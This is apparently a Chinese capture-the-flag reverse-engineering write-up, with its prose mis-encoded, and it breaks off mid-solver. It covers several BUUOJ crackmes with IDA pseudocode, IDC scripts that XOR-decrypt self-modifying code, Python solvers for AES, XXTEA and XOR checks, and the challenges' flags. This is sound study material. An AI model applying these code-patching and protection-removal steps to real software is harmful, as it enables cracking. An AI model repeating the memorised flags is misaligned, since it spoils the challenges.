è¿™é‡Œåœ¨å¯¹å‡½æ•°sub_402219çš„å†…å®¹è¿›è¡Œå¼‚æˆ–è¿ç®— è€Œsub_402219çš„å†…å®¹å¦‚ä¸‹ 12345678910111213141516171819.text:0000000000402219 sub_402219 proc near ; CODE XREF: main+CAâ†‘p.text:0000000000402219 ; DATA XREF: main:loc_40217Câ†‘o.text:0000000000402219 ; __unwind &#123;.text:0000000000402219 int 3 ; Trap to Debugger.text:0000000000402219 sub_402219 endp.text:0000000000402219.text:0000000000402219 ; ---------------------------------------------------------------------------.text:000000000040221A dw 10D1h, 0D17Ch, 7518h.text:0000000000402220 dq 812410D199999969h, 0BC9D12D1FD666666h, 61DC10D1999999B1h.text:0000000000402220 dq 6666A91C14D159A8h, 10D199F9A8E92766h, 12D1666671BA715Eh.text:0000000000402220 dq 1C14D1666666810Ch, 0D14F10D1666666A9h, 0D166666E9E715E10h.text:0000000000402220 dq 14D1666666811C12h, 6666A91C14D189C9h, 715E10D14F10D166h.text:0000000000402220 dq 66B11C5E66666F73h, 1C5E999999986666h, 99999999666666B5h.text:0000000000402220 dq 666666B51C12A372h, 66811C12D149FAD1h, 892F964998D16666h.text:0000000000402220 dq 1D1666666B51C12h, 0A199F9A939192F96h, 6666B11C5E93ED5Bh.text:0000000000402220 dq 0B51C1A9999999966h, 66B5241A98666666h, 0B11C1224E7866666h.text:0000000000402220 dq 0FD61D412D1666666h, 999999B1BC95AAD1h, 5066667AC0719CEDh.text:0000000000402220 dq 801F0F5Ah.text:0000000000402300 é‚£ä¹ˆå¯ä»¥çœ‹åˆ°å‡½æ•°ä¸­å†…å®¹æ— æ³•è¢«IDAè§£æ, æ‰€ä»¥è¢«è®¤ä¸ºæ˜¯æ•°æ® æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨IDCè„šæœ¬æ¥å¯¹è¿™éƒ¨åˆ†æ•°æ®è¿›è¡Œè¿˜åŸ 12345678910#include &lt;idc.idc&gt;static main()&#123; auto addr = 0x402219; auto i; for (i = 0; i &lt;= 223; ++i) &#123; PatchByte(addr+i, Byte(addr+i)^0x99); &#125;&#125; å…ˆå…¨éƒ¨è½¬ä¸ºæ•°æ®, å†å¼ºåˆ¶è½¬ä¸ºä»£ç , æœ€åå†åˆ›å»ºå‡½æ•°, ä¸”mainå‡½æ•°é‡Œnopæ‰é‚£æ®µå¾ªç¯å¼‚æˆ–çš„ä»£ç  åŒæ—¶mainå‡½æ•°éœ€è¦åŒ…å«loc_402205, loc_40220Fè¿™ä¸¤æ®µä»£ç , æ“ä½œåŒä¸Š è¿˜åŸä¹‹åçš„å‡½æ•°main 1234567891011121314151617181920void __fastcall __noreturn main(int a1, char **a2, char **a3)&#123; char s[40]; // [rsp+20h] [rbp-30h] BYREF unsigned __int64 v4; // [rsp+48h] [rbp-8h] v4 = __readfsqword(0x28u); __isoc99_scanf(&quot;%39s&quot;, s); if ( (unsigned int)strlen(s) != 32 ) &#123; puts(&quot;Wrong!&quot;); exit(0); &#125; mprotect(&amp;dword_400000, 0xF000uLL, 7); sub_40207B((__int64)&amp;unk_603170); if ( (unsigned int)sub_402219((__int64)s) ) puts(&quot;Correct!&quot;); else puts(&quot;Wrong!&quot;); exit(0);&#125; å…ˆåˆ†æå‡½æ•°sub_40207B 12345678910111213141516unsigned __int64 __fastcall sub_40207B(__int64 a1)&#123; char v2[16]; // [rsp+10h] [rbp-50h] BYREF __int64 v3; // [rsp+20h] [rbp-40h] BYREF __int64 v4; // [rsp+30h] [rbp-30h] BYREF __int64 v5; // [rsp+40h] [rbp-20h] BYREF unsigned __int64 v6; // [rsp+58h] [rbp-8h] v6 = __readfsqword(0x28u); sub_401CF9(&amp;BASE64_table_603120, 0x40uLL, (__int64)v2); sub_401CF9(&amp;CRC32_table_603100, 0x14uLL, (__int64)&amp;v3); sub_401CF9(&amp;Prime_Constants_char_6030C0, 0x35uLL, (__int64)&amp;v4); sub_401CF9(MD5_Constants_4025C0, 0x100uLL, (__int64)&amp;v5); sub_401CF9(v2, 0x40uLL, a1); return __readfsqword(0x28u) ^ v6;&#125; BASE64_table_603120ç»è¿‡å‡½æ•°sub_401CF9çš„è¿è¡Œä¹‹åç»“æœä¿å­˜äºv2 v2ç»è¿‡å‡½æ•°sub_401CF9çš„è¿è¡Œä¹‹åç»“æœä¿å­˜äºa1, å³unk_603170 ä»£ç è¿‡äºå¤æ‚, åŠ¨è°ƒå¾—åˆ°unk_603170çš„å†…å®¹ 123_603170 = [0xCB, 0x8D, 0x49, 0x35, 0x21, 0xB4, 0x7A, 0x4C, 0xC1, 0xAE, 0x7E, 0x62, 0x22, 0x92, 0x66, 0xCE] åˆ†æsub_402219 12345678910111213141516171819__int64 __fastcall sub_402219(__int64 a1)&#123; unsigned int v2; // [rsp+18h] [rbp-D8h] int i; // [rsp+1Ch] [rbp-D4h] char v4[200]; // [rsp+20h] [rbp-D0h] BYREF unsigned __int64 v5; // [rsp+E8h] [rbp-8h] v5 = __readfsqword(0x28u); sub_400A71((__int64)v4, (__int64)&amp;unk_603170); sub_40196E((__int64)v4, a1); sub_40196E((__int64)v4, a1 + 16); v2 = 1; for ( i = 0; i &lt;= 31; ++i ) &#123; if ( *(byte_0 *)(i + a1) != qword_6030A0[i] ) v2 = 0; &#125; return v2;&#125; sub_400A71å¤„ç†unk_603170 ç»§ç»­è·Ÿè¿›çœ‹åˆ°ä¸€ä¸ªåä¸ºRijnDael_AES_LONG_4023A0æ•°æ®æ®µ, é‚£ä¹ˆåŸºæœ¬å¯ä»¥åˆ¤æ–­è¿™æ˜¯ä¸€ä¸ªAESåŠ å¯†ç¨‹åºäº† sub_40196Eä¹Ÿå°±æ˜¯ç”¨äºåŠ å¯†ç”¨æˆ·æ‰€è¾“å…¥çš„å­—ç¬¦ä¸², ä¸”åŠ å¯†æ¨¡å¼ä¸ºECB(32å­—èŠ‚çš„æ•°æ®åˆ†ä¸¤æ¬¡å•ç‹¬åŠ å¯†), æœ€åçš„å¯†æ–‡å­˜äºqword_6030A0 12345_6030A0 = [0xBC, 0x0A, 0xAD, 0xC0, 0x14, 0x7C, 0x5E, 0xCC, 0xE0, 0xB1, 0x40, 0xBC, 0x9C, 0x51, 0xD5, 0x2B, 0x46, 0xB2, 0xB9, 0x43, 0x4D, 0xE5, 0x32, 0x4B, 0xAD, 0x7F, 0xB4, 0xB3, 0x9C, 0xDB, 0x4B, 0x5B] 123456789101112131415161718#!/usr/bin/env python3from Crypto.Cipher import AES_603170 = [0xCB, 0x8D, 0x49, 0x35, 0x21, 0xB4, 0x7A, 0x4C, 0xC1, 0xAE, 0x7E, 0x62, 0x22, 0x92, 0x66, 0xCE]_6030A0 = [0xBC, 0x0A, 0xAD, 0xC0, 0x14, 0x7C, 0x5E, 0xCC, 0xE0, 0xB1, 0x40, 0xBC, 0x9C, 0x51, 0xD5, 0x2B, 0x46, 0xB2, 0xB9, 0x43, 0x4D, 0xE5, 0x32, 0x4B, 0xAD, 0x7F, 0xB4, 0xB3, 0x9C, 0xDB, 0x4B, 0x5B]cipher = &quot;&quot;for _ in _6030A0: cipher += chr(_)key = &quot;&quot;for _ in _603170: key += chr(_)aes = AES.new(key.encode(&quot;ISO-8859-1&quot;), AES.MODE_ECB)print(aes.decrypt(cipher.encode(&quot;ISO-8859-1&quot;)).decode()) flag{924a9ab2163d390410d0a1f670} [2019çº¢å¸½æ¯]xx é“¾æ¥: https://buuoj.cn/challenges#[2019çº¢å¸½æ¯]xx EXE 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rbx __int64 v4; // rax __int128 *v5; // rax __int64 v6; // r11 __int128 *v7; // r14 int v8; // edi __int128 *v9; // rsi char v10; // r10 int v11; // edx __int64 v12; // r8 unsigned __int64 v13; // rcx __int64 v14; // rcx unsigned __int64 v15; // rax unsigned __int64 i; // rax __int64 v17; // rax size_t v18; // rsi _BYTE *v19; // rbx _BYTE *v20; // r9 int v21; // er11 char *v22; // r8 __int64 v23; // rcx char v24; // al __int64 v25; // r9 __int64 v26; // rdx __int64 v27; // rax size_t Size; // [rsp+20h] [rbp-48h] BYREF __int128 v30; // [rsp+28h] [rbp-40h] BYREF int v31; // [rsp+38h] [rbp-30h] int v32; // [rsp+3Ch] [rbp-2Ch] int Code[4]; // [rsp+40h] [rbp-28h] BYREF int v34; // [rsp+50h] [rbp-18h] *(_OWORD *)Code = 0i64; v34 = 0; sub_1400018C0(std::cin, argv, Code); v3 = -1i64; v4 = -1i64; do ++v4; while ( *((_BYTE *)Code + v4) ); if ( v4 != 19 ) &#123; sub_140001620(std::cout, &quot;error\\n&quot;); _exit((int)Code); &#125; v5 = (__int128 *)operator new(5ui64); v6 = *(_QWORD *)&amp;::Code; v7 = v5; v8 = 0; v9 = v5; do &#123; v10 = *((_BYTE *)v9 + (char *)Code - (char *)v5); v11 = 0; *(_BYTE *)v9 = v10; v12 = 0i64; v13 = -1i64; do ++v13; while ( *(_BYTE *)(v6 + v13) ); if ( v13 ) &#123; do &#123; if ( v10 == *(_BYTE *)(v6 + v12) ) break; ++v11; ++v12; &#125; while ( v11 &lt; v13 ); &#125; v14 = -1i64; do ++v14; while ( *(_BYTE *)(v6 + v14) ); if ( v11 == v14 ) _exit(v6); v9 = (__int128 *)((char *)v9 + 1); &#125; while ( (char *)v9 - (char *)v5 &lt; 4 ); *((_BYTE *)v5 + 4) = 0; do ++v3; while ( *((_BYTE *)Code + v3) ); v15 = 0i64; v30 = *v7; while ( *((_BYTE *)&amp;v30 + v15) ) &#123; if ( !*((_BYTE *)&amp;v30 + v15 + 1) ) &#123; ++v15; break; &#125; if ( !*((_BYTE *)&amp;v30 + v15 + 2) ) &#123; v15 += 2i64; break; &#125; if ( !*((_BYTE *)&amp;v30 + v15 + 3) ) &#123; v15 += 3i64; break; &#125; v15 += 4i64; if ( v15 &gt;= 0x10 ) break; &#125; for ( i = v15 + 1; i &lt; 0x10; ++i ) *((_BYTE *)&amp;v30 + i) = 0; v17 = (__int64)sub_140001AB0((__int64)Code, v3, (unsigned __int8 *)&amp;v30, &amp;Size); v18 = Size; v19 = (_BYTE *)v17; v20 = operator new(Size); v21 = 1; *v20 = v19[2]; v22 = v20 + 1; v20[1] = *v19; v20[2] = v19[3]; v20[3] = v19[1]; v20[4] = v19[6]; v20[5] = v19[4]; v20[6] = v19[7]; v20[7] = v19[5]; v20[8] = v19[10]; v20[9] = v19[8]; v20[10] = v19[11]; v20[11] = v19[9]; v20[12] = v19[14]; v20[13] = v19[12]; v20[14] = v19[15]; v20[15] = v19[13]; v20[16] = v19[18]; v20[17] = v19[16]; v20[18] = v19[19]; v20[19] = v19[17]; v20[20] = v19[22]; v20[21] = v19[20]; v20[22] = v19[23]; for ( v20[23] = v19[21]; v21 &lt; v18; ++v22 ) &#123; v23 = 0i64; if ( v21 / 3 &gt; 0 ) &#123; v24 = *v22; do &#123; v24 ^= v20[v23++]; *v22 = v24; &#125; while ( v23 &lt; v21 / 3 ); &#125; ++v21; &#125; *(_QWORD *)&amp;v30 = 0xC0953A7C6B40BCCEui64; v25 = v20 - (_BYTE *)&amp;v30; *((_QWORD *)&amp;v30 + 1) = 0x3502F79120209BEFi64; v26 = 0i64; v31 = 0xC8021823; v32 = 0xFA5656E7; do &#123; if ( *((_BYTE *)&amp;v30 + v26) != *((_BYTE *)&amp;v30 + v26 + v25) ) _exit(v8 * v8); ++v8; ++v26; &#125; while ( v26 &lt; 24 ); v27 = sub_140001620(std::cout, &quot;You win!&quot;); std::ostream::operator&lt;&lt;(v27, sub_1400017F0); return 0;&#125; IDAä¸­ä½¿ç”¨æ’ä»¶FindCryptå¯ä»¥çœ‹åˆ°ç¨‹åºä½¿ç”¨äº†TEAåŠ å¯† ç»“åˆé¢˜ç›®å¯ä»¥çŒœå‡ºæ˜¯XXTEAåŠ å¯† è¿™é¢˜åŸºæœ¬æ˜¯çœ‹ç€åˆ«äººçš„WPåšå‡ºæ¥çš„ 1.text:0000000140001C4B global TEA_DELTA_140001C4B $c0 b&#39;\\xb9y7\\x9e&#39; ä»ä¸Šå¾€ä¸‹åˆ†æ ç”¨æˆ·è¾“å…¥å­—ç¬¦ä¸², é•¿åº¦ä¸º19 å‰å››ä¸ªå­—ç¬¦åœ¨å­—ç¬¦é›†&quot;qwertyuiopasdfghjklzxcvbnm1234567890&quot;ä¸­ å–å‰å››å­—èŠ‚ä¸ºå¯†é’¥ åŠ å¯†ç»“æœä¹±åº è¿­ä»£å¼‚æˆ– æ ¡éªŒåŠ å¯†ç»“æœ è¿­ä»£å¼‚æˆ–çš„æ–¹å¼å¦‚ä¸‹ 1234567cipher[3] &#x3D; cipher[3] ^ cipher[0]cipher[4] &#x3D; cipher[4] ^ cipher[0]cipher[5] &#x3D; cipher[5] ^ cipher[0]cipher[6] &#x3D; cipher[6] ^ cipher[0] ^ cipher[1]cipher[7] &#x3D; cipher[7] ^ cipher[0] ^ cipher[1]cipher[8] &#x3D; cipher[8] ^ cipher[0] ^ cipher[1]... å¯†æ–‡å¦‚ä¸‹(å¤§ç«¯èµ‹å€¼, ä¹‹åéœ€è¦è½¬ä¸ºå°ç«¯çš„å­—ç¬¦ä¸²) 1234*(_QWORD *)&amp;v30 &#x3D; 0xC0953A7C6B40BCCEui64;*((_QWORD *)&amp;v30 + 1) &#x3D; 0x3502F79120209BEFi64;v31 &#x3D; 0xC8021823;v32 &#x3D; 0xFA5656E7; ä¸”è¿™ä¸‰ä¸ªå˜é‡çš„å†…å­˜åˆ†å¸ƒå¦‚ä¸‹ 123__int128 v30; &#x2F;&#x2F; [rsp+28h] [rbp-40h] BYREFint v31; &#x2F;&#x2F; [rsp+38h] [rbp-30h]int v32; &#x2F;&#x2F; [rsp+3Ch] [rbp-2Ch] æ‰€ä»¥å››ä¸ªæ•°æ®çš„æ•´ä½“æ‰æ˜¯å¯†æ–‡éƒ¨åˆ† 12345678910111213141516171819202122232425262728293031323334#!/usr/bin/env python3import binasciiimport xxteacipher = [0xC0953A7C6B40BCCE, 0x3502F79120209BEF, 0xC8021823, 0xFA5656E7]# è½¬å°ç«¯å­—èŠ‚ä¸²_byte = b&quot;&quot;for _ in cipher: _byte += binascii.unhexlify(hex(_)[2:].encode(&quot;ISO-8859-1&quot;))[::-1]# è¿­ä»£å¼‚æˆ–__byte = [_ for _ in _byte]for _ in range(len(__byte)-1, -1, -1): for __ in range(_//3): __byte[_] = __byte[_] ^ __byte[__]# å¼‚æˆ–ç»“æœè½¬ä¸ºå­—èŠ‚ä¸²___byte = &quot;&quot;for _ in __byte: ___byte += chr(_)___byte = ___byte.encode(&quot;ISO-8859-1&quot;)# è¿˜åŸé¡ºåºseq_enc = [2, 0, 3, 1, 6, 4, 7, 5, 10, 8, 11, 9, 14, 12, 15, 13, 18, 16, 19, 17, 22, 20, 23, 21]seq_dec = [-1 for _ in seq_enc]for _ in range(len(seq_enc)): seq_dec[_] = seq_enc.index(_)____byte = b&quot;&quot;for _ in range(len(___byte)): ____byte += chr(___byte[seq_dec[_]]).encode(&quot;ISO-8859-1&quot;)# è§£å¯†key = &quot;flag&quot;flag = xxtea.decrypt(____byte, key).decode()print(flag) flag{CXX_and_++tea} findKey é“¾æ¥: https://buuoj.cn/challenges#findKey EXE 32 ä¸€å¼€å§‹æ²¡æ‰¾åˆ°ä¸»å‡½æ•° 1.rdata:00423028 aFlag db &#39;flag&#123;&#125;&#39;,0 ; DATA XREF: .text:00401A3Aâ†‘o æ‰¾åˆ°è¿™æ ·çš„ä¸€ä¸ªå­—ç¬¦ä¸² æœç´¢æ–‡æœ¬ä¹‹åæ‰¾åˆ°ä½ç½®loc_401A37 ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰è¢«å®šä¹‰æˆå‡½æ•° ç²—ç•¥çœ‹ä¸‹æœ‰ä¸€æ®µç–‘ä¼¼æ’å…¥äº†èŠ±æŒ‡ä»¤çš„ä»£ç  123456789101112.text:0040191D loc_40191D: ; CODE XREF: .text:0040193Dâ†“j.text:0040191D push offset byte_428C54.text:00401922 call _strlen.text:00401927 add esp, 4.text:0040192A push eax.text:0040192B push offset byte_428C54.text:00401930 call sub_40101E.text:00401935 add esp, 0Ch.text:00401938 nop.text:00401939 jz short loc_401948.text:0040193B jnz short loc_401948.text:0040193D jmp short near ptr loc_40191D+2 æ ¹æ®æˆ‘åšçš„é‚£äº›é€†å‘é¢˜ç›®çš„ç»éªŒ æŒ‰ç†è¯´jzçš„å‰ä¸€æ¡æŒ‡ä»¤æ˜¯èƒ½å¤Ÿå¯¹ZFäº§ç”Ÿå½±å“çš„, ä¾‹å¦‚cmp, test æ›´å¥‡æ€ªçš„æ˜¯åé¢è·Ÿäº†ä¸€æ¡jnzå’Œä¸€æ¡jmp æŠŠè¿™ä¸‰æ¡nopæ‰å°±å¯ä»¥å®šä¹‰ä¸ºå‡½æ•°äº† åç¼–è¯‘åäº†ä¸‹ä¼ªä»£ç , æ„Ÿè§‰å·®ä¸å¤šå°±æ˜¯mainå‡½æ•°äº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // eax size_t v5; // eax DWORD v6; // eax HWND v7; // eax int v8; // eax int v9; // eax const CHAR *v10; // [esp+0h] [ebp-44Ch] const CHAR *v11; // [esp+4h] [ebp-448h] UINT v12; // [esp+8h] [ebp-444h] CHAR v13[256]; // [esp+54h] [ebp-3F8h] BYREF char v14[7]; // [esp+154h] [ebp-2F8h] BYREF __int16 v15; // [esp+15Bh] [ebp-2F1h] char v16; // [esp+15Dh] [ebp-2EFh] char Str[33]; // [esp+160h] [ebp-2ECh] BYREF char v18[220]; // [esp+181h] [ebp-2CBh] BYREF __int16 v19; // [esp+25Dh] [ebp-1EFh] char v20; // [esp+25Fh] [ebp-1EDh] CHAR v21[256]; // [esp+260h] [ebp-1ECh] BYREF CHAR String[4]; // [esp+360h] [ebp-ECh] BYREF int v23; // [esp+364h] [ebp-E8h] __int16 v24; // [esp+368h] [ebp-E4h] CHAR Text[32]; // [esp+36Ch] [ebp-E0h] BYREF struct tagRECT Rect; // [esp+38Ch] [ebp-C0h] BYREF CHAR Buffer[100]; // [esp+39Ch] [ebp-B0h] BYREF HDC hdc; // [esp+400h] [ebp-4Ch] struct tagPAINTSTRUCT Paint; // [esp+404h] [ebp-48h] BYREF int v30; // [esp+444h] [ebp-8h] int v31; // [esp+448h] [ebp-4h] LPARAM lParam; // [esp+460h] [ebp+14h] LoadStringA(hInstance, 0x6Au, Buffer, 0x64); if ( (unsigned int)argv &gt; 0x111 ) &#123; if ( argv == (const char **)517 ) &#123; if ( strlen((const char *)String1) &gt; 6 ) ExitProcess(0); if ( strlen((const char *)String1) ) &#123; memset(v21, 0, sizeof(v21)); v5 = strlen((const char *)String1); memcpy(v21, String1, v5); v6 = strlen((const char *)String1); v7 = (HWND)sub_40101E(String1, v6, (LPSTR)String1); MessageBoxA(v7, v10, v11, v12); strcpy(Str, &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;); memset(v18, 0, sizeof(v18)); v19 = 0; v20 = 0; strcpy(v14, &quot;SS&quot;); *(_DWORD *)&amp;v14[3] = 0; v15 = 0; v16 = 0; v8 = strlen(Str); sub_401005(v14, (int)Str, v8); if ( _strcmpi((const char *)String1, Str) ) &#123; SetWindowTextA((HWND)argc, &quot;flag&#123;&#125;&quot;); MessageBoxA((HWND)argc, &quot;Are you kidding me?&quot;, &quot;^_^&quot;, 0); ExitProcess(0); &#125; memcpy(v13, &amp;unk_423030, 0x32u); v9 = strlen(v13); sub_401005(v21, (int)v13, v9); MessageBoxA((HWND)argc, v13, 0, 0x32u); &#125; ++dword_428D54; &#125; else &#123; if ( argv != (const char **)520 ) return DefWindowProcA((HWND)argc, (UINT)argv, (WPARAM)envp, lParam); if ( dword_428D54 == 16 ) &#123; strcpy(String, &quot;ctf&quot;); v23 = 0; v24 = 0; SetWindowTextA((HWND)argc, String); strcpy(Text, &quot;Are you kidding me?&quot;); MessageBoxA((HWND)argc, Text, Buffer, 0); &#125; ++dword_428D54; &#125; &#125; else if ( argv == (const char **)273 ) &#123; v31 = (unsigned __int16)envp; v30 = HIWORD(envp); if ( (unsigned __int16)envp == 104 ) &#123; DialogBoxParamA(hInstance, (LPCSTR)0x67, (HWND)argc, (DLGPROC)DialogFunc, 0); &#125; else &#123; if ( (unsigned __int16)envp != 105 ) return DefWindowProcA((HWND)argc, (UINT)argv, (WPARAM)envp, lParam); DestroyWindow((HWND)argc); &#125; &#125; else if ( argv == (const char **)2 ) &#123; PostQuitMessage(0); &#125; else &#123; if ( argv != (const char **)15 ) return DefWindowProcA((HWND)argc, (UINT)argv, (WPARAM)envp, lParam); hdc = BeginPaint((HWND)argc, &amp;Paint); GetClientRect((HWND)argc, &amp;Rect); v4 = strlen(Buffer); DrawTextA(hdc, Buffer, v4, &amp;Rect, 1u); EndPaint((HWND)argc, &amp;Paint); &#125; return 0;&#125; å…ˆè·Ÿè¿›sub_40101E 1if ( CryptCreateHash(phProv, 0x8003u, 0, 0, &amp;phHash) ) çœ‹åˆ°è¿™å¥å°±çŸ¥é“æ˜¯md5åŠ å¯†äº† å†è·Ÿè¿›sub_401005 12345678910111213141516unsigned int __cdecl sub_401590(LPCSTR lpString, int a2, int a3)&#123; unsigned int result; // eax unsigned int i; // [esp+4Ch] [ebp-Ch] unsigned int v5; // [esp+54h] [ebp-4h] v5 = lstrlenA(lpString); for ( i = 0; ; ++i ) &#123; result = i; if ( i &gt;= a3 ) break; *(_BYTE *)(i + a2) ^= lpString[i % v5]; &#125; return result;&#125; ç®€å•çš„å¼‚æˆ– 1sub_401005(v14, (int)Str, v8); v14 = &quot;SS&quot; Str = &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot; v8 = 32 ä¹Ÿå°±æ˜¯è¯´Stråœ¨å¼‚æˆ–ä¹‹åä¸String1çš„md5ç»“æœæ¯”è¾ƒ 123456#!/usr/bin/env python3xor = &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;dexor = &quot;&quot;for _ in xor: dexor += chr(ord(_) ^ ord(&quot;S&quot;))print(dexor) å¾—åˆ°c8837b23ff8aaa8a2dde915473ce0991 md5è§£å¯†ç»“æœä¸º123321 å†è·Ÿè¿›å‡½æ•°DialogFunc 123456789101112131415161718192021222324252627int __stdcall sub_401B20(HWND hDlg, int a2, int a3, int a4)&#123; switch ( a2 ) &#123; case 0x110: return 1; case 0x111: if ( (unsigned __int16)a3 != 1 &amp;&amp; (unsigned __int16)a3 != 2 ) goto LABEL_6; EndDialog(hDlg, (unsigned __int16)a3); return 1; case 0x202:LABEL_6: String1[dword_428C50++] = 49; return 0; case 0x205: String1[dword_428C50++] = 51; return 0; case 0x208: if ( dword_428D58 &lt; 3 ) ++dword_428D5C; String1[dword_428C50++] = 50; return 0; default: return 0; &#125;&#125; è¿™é‡Œçš„a2ä¸€å¼€å§‹æ²¡å¤ªæ‡‚ åæ¥çœ‹äº†åˆ«äººçš„wpæ‰çŸ¥é“è²Œä¼¼æ˜¯Windows Message 123#define WM_LBUTTONUP 0x0202#define WM_MBUTTONUP 0x0208#define WM_RBUTTONUP 0x0205 https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-lbuttonup https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-mbuttonup https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-rbuttonup é‚£ä¹ˆä¹Ÿå°±æ˜¯æŒ‰é¼ æ ‡å·¦é”®, é¼ æ ‡ä¸­é”®, é¼ æ ‡å³é”®, é¼ æ ‡å³é”®, é¼ æ ‡ä¸­é”®, é¼ æ ‡å·¦é”® å€¼å¾—ä¸€æçš„æ˜¯, è°ƒç”¨å‡½æ•°DialogFuncä»£ç  1DialogBoxParamA(hInstance, (LPCSTR)103, (HWND)argc, (DLGPROC)DialogFunc, 0); åœ¨Resource Hackerä¸­å¯ä»¥çœ‹åˆ°ç¼–å·103å¯¹åº”ç€Aboutå¯¹è¯æ¡† ä¹Ÿå°±æ˜¯è¯´éœ€è¦åœ¨Aboutå¯¹è¯æ¡†ä¸­æŒ‰ä¸Šè¿°é¡ºåºç‚¹å‡»é¼ æ ‡ ä¸æ˜¯åšè¿™é“é¢˜æˆ‘éƒ½ä¸ä¼šæ„è¯†åˆ°æˆ‘çš„é¼ æ ‡ä¸­é”®å·²ç»æŠ¥åºŸäº†, æœ€ååŠ¨è°ƒæ”¹String1çš„å€¼ flag{n0_Zu0_n0_die} [FlareOn5]Minesweeper Championship Registration é“¾æ¥: https://buuoj.cn/challenges#[FlareOn5]Minesweeper Championship Registration Java 1234567891011121314151617import javax.swing.JOptionPane;public class InviteValidator&#123; public static void main(String[] args) &#123; String response = JOptionPane.showInputDialog(null, &quot;Enter your invitation code:&quot;, &quot;Minesweeper Championship 2018&quot;, 3); if (response.equals(&quot;GoldenTicket2018@flare-on.com&quot;)) &#123; JOptionPane.showMessageDialog(null, &quot;Welcome to the Minesweeper Championship 2018!\\nPlease enter the following code to the ctfd.flare-on.com website to compete:\\n\\n&quot; + response, &quot;Success!&quot;, -1); &#125; else &#123; JOptionPane.showMessageDialog(null, &quot;Incorrect invitation code. Please try again next year.&quot;, &quot;Failure&quot;, 0); &#125; &#125;&#125; flagå†™è„¸ä¸Šäº† flag{GoldenTicket2018@flare-on.com} [ç½‘é¼æ¯ 2020 é’é¾™ç»„]jocker é“¾æ¥: https://buuoj.cn/challenges#[ç½‘é¼æ¯ 2020 é’é¾™ç»„]jocker EXE 32 ä¸»å‡½æ•°çœ‹åˆ°å¯¹å‡½æ•°è¿›è¡Œå¼‚æˆ–å°±çŸ¥é“ä¸å¯¹åŠ²äº† 12345678910#include &lt;idc.idc&gt;static main()&#123; auto addr = 0x00401500; auto i; for (i = 0; i &lt;= 186; ++i) &#123; PatchByte(addr+i, Byte(addr+i)^0x41); &#125;&#125; å…·ä½“æ­¥éª¤å‚ç…§è¿™é‡Œ http://yoloyolo.top/2021/05/31/Reverse-3/#gwctf-2019re3 å‡½æ•°finallyçš„å‰ä¸€éƒ¨åˆ†ä¹Ÿæœ‰è¢«å¼‚æˆ–è¿‡, éœ€è¦é‡æ–°å®šä¹‰ä¸ºå‡½æ•° å‡½æ•°main 123456789101112131415161718192021222324252627int __cdecl main(int argc, const char **argv, const char **envp)&#123; char Str[50]; // [esp+12h] [ebp-96h] BYREF char Destination[80]; // [esp+44h] [ebp-64h] BYREF DWORD flOldProtect; // [esp+94h] [ebp-14h] BYREF size_t v7; // [esp+98h] [ebp-10h] int v8; // [esp+9Ch] [ebp-Ch] __main(); puts(&quot;please input you flag:&quot;); if ( !VirtualProtect(encrypt, 0xC8u, 4u, &amp;flOldProtect) ) exit(1); scanf(&quot;%40s&quot;, Str); v7 = strlen(Str); if ( v7 != 24 ) &#123; puts(&quot;Wrong!&quot;); exit(0); &#125; strcpy(Destination, Str); wrong(Str); omg(Str); v8 = 0; if ( encrypt(Destination) ) finally(Destination); return 0;&#125; è·Ÿè¿›å‡½æ•°wrong 123456789101112131415char *__cdecl wrong(char *a1)&#123; char *result; // eax int i; // [esp+Ch] [ebp-4h] for ( i = 0; i &lt;= 23; ++i ) &#123; result = &amp;a1[i]; if ( (i &amp; 1) != 0 ) a1[i] -= i; else a1[i] ^= i; &#125; return result;&#125; ç®€å•çš„åŠ å¯† ç»§ç»­çœ‹å‡½æ•°omg 1234567891011121314151617181920int __cdecl omg(char *a1)&#123; int result; // eax int v2[24]; // [esp+18h] [ebp-80h] BYREF int i; // [esp+78h] [ebp-20h] int v4; // [esp+7Ch] [ebp-1Ch] v4 = 1; qmemcpy(v2, dword_4030C0, sizeof(v2)); for ( i = 0; i &lt;= 23; ++i ) &#123; if ( a1[i] != v2[i] ) v4 = 0; &#125; if ( v4 == 1 ) result = puts(&quot;hahahaha_do_you_find_me?&quot;); else result = puts(&quot;wrong ~~ But seems a little program&quot;); return result;&#125; 12345678910111213#!/usr/bin/env python3_4030C0 = [0x66, 0x6B, 0x63, 0x64, 0x7F, 0x61, 0x67, 0x64, 0x3B, 0x56, 0x6B, 0x61, 0x7B, 0x26, 0x3B, 0x50, 0x63, 0x5F, 0x4D, 0x5A, 0x71, 0x0C, 0x37, 0x66]flag = &quot;&quot;for _ in range(len(_4030C0)): if _ % 2 == 0: flag += chr(_4030C0[_] ^ _) else: flag += chr(_4030C0[_] + _)print(flag) å¾—åˆ°flag&#123;fak3_alw35_sp_me!!&#125; ç„¶è€Œæ˜¯ä¸ªå‡flag ç»§ç»­çœ‹å‡½æ•°encrypt 1234567891011121314151617181920int __cdecl encrypt(char *a1)&#123; int v2[19]; // [esp+1Ch] [ebp-6Ch] BYREF int v3; // [esp+68h] [ebp-20h] int i; // [esp+6Ch] [ebp-1Ch] v3 = 1; qmemcpy(v2, dword_403040, sizeof(v2)); for ( i = 0; i &lt;= 18; ++i ) &#123; if ( (char)(a1[i] ^ Buffer[i]) != v2[i] ) &#123; puts(&quot;wrong ~&quot;); v3 = 0; exit(0); &#125; &#125; puts(&quot;come here&quot;); return v3;&#125; 12345678910#!/usr/bin/env python3flag = &quot;&quot;_buffer = &quot;hahahaha_do_you_find_me?&quot;_403040 = [0x0E, 0x0D, 0x09, 0x06, 